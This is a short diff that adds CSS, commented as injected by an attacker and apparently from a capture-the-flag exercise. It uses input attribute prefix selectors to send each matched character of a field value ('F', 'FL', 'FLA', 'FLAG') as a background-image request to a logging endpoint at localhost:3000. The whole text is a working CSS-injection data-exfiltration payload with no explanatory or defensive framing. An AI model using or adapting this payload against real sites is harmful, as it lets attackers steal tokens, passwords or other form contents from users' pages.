@@ -1,0 +1,5 @@
+/* Malicious CSS injected by the attacker */
+input[value^="F"] { background-image: url("http://localhost:3000/log?char=F"); }
+input[value^="FL"] { background-image: url("http://localhost:3000/log?char=L"); }
+input[value^="FLA"] { background-image: url("http://localhost:3000/log?char=A"); }
+input[value^="FLAG"] { background-image: url("http://localhost:3000/log?char=G"); }
